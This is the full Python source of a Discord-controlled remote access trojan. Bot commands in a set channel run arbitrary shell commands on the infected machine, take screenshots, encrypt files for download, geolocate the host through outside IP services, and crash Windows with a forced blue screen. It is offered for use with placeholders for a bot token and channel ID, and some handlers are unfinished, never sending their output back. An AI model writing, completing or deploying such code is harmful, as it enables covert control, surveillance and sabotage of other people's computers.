import discord
import subprocess
import os
import platform
import pyautogui
import requests
from discord.ext import commands
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


TOKEN = 'put ur token here'
CHANNEL_ID = put your channel id here         
ENCRYPTION_KEY = b'mysecretpassword!!'   


def encrypt_file(input_path, output_path, key=ENCRYPTION_KEY):
    backend = default_backend()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    with open(input_path, 'rb') as f:
        data = f.read()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    encrypted = encryptor.update(padded_data) + encryptor.finalize()
    with open(output_path, 'wb') as f:
        f.write(iv + encrypted)

def decrypt_file(input_path, output_path, key=ENCRYPTION_KEY):
    backend = default_backend()
    with open(input_path, 'rb') as f:
        iv = f.read(16)
        encrypted_data = f.read()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    with open(output_path, 'wb') as f:
        f.write(data)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='/', intents=intents, help_command=None)  # Disable default help

def check_channel(ctx):
    return ctx.channel.id == CHANNEL_ID

@bot.command()
async def shell(ctx, *, command: str):
    if not check_channel(ctx):
        return
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
        output = output.decode('utf-8', errors='ignore')
    except Exception:
        return


@bot.command()
async def download(ctx, *, filepath: str):
    if not check_channel(ctx):
        return
    if os.path.exists(filepath):
        encrypted_path = filepath + ".enc"
        try:
            encrypt_file(filepath, encrypted_path)

            os.remove(encrypted_path)
        except Exception:
            return
    else:
        return

@bot.command()
async def upload(ctx):
    if not check_channel(ctx):
        return
    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        encrypted_filename = "enc_" + attachment.filename
        decrypted_filename = attachment.filename
        await attachment.save(encrypted_filename)
        try:
            decrypt_file(encrypted_filename, decrypted_filename)
            os.remove(encrypted_filename)
        except Exception:
            pass

@bot.command()
async def screenshot(ctx):
    if not check_channel(ctx):
        return
    screenshot_path = "screenshot.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)

    if os.path.exists(screenshot_path):
        os.remove(screenshot_path)

@bot.command()
async def bsod(ctx):
    if not check_channel(ctx):
        return
    if platform.system() != "Windows":
        return
    try:
        import ctypes
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    except Exception:
        pass

@bot.command()
async def location(ctx):
    if not check_channel(ctx):
        return
    try:
        ip = requests.get('https://api.ipify.org').text
        geo_req = requests.get(f'http://ip-api.com/json/{ip}').json()
        if geo_req['status'] == 'success':
            pass  
    except Exception:
        pass

@bot.command()
async def help(ctx):
    if not check_channel(ctx):
        return

if __name__ == "__main__":
    bot.run(TOKEN)
